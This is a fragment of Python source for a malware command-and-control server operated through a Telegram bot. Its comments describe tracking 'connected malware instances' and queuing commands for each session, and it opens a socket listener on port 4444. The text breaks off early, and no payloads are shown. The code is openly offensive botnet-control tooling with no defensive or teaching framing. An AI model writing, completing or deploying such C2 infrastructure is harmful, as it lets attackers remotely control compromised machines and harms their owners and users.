import asyncio
import json
import os
import socket
import struct
import time
import traceback
from typing import Dict, List, Callable, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters
)

# --- C2 Configuration ---
C2_PORT = 4444
C2_HOST = "0.0.0.0"
ADMIN_IDS = [123456789, 987654321] # Replace with real Admin's IDs
ACTIVE_BOTS: Dict[str, Dict] = {}  # Stores connected malware instances {session_id: {ip, host, timestamp, last_active}}
COMMAND_QUEUE: Dict[str, List[str]] = {}  # Stores pending commands per session

# --- Core C2 Logic ---

class C2Server:
    def __init__(self):
        self.server_socket = None
        self.is_running = True
        
    async def start_listening(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)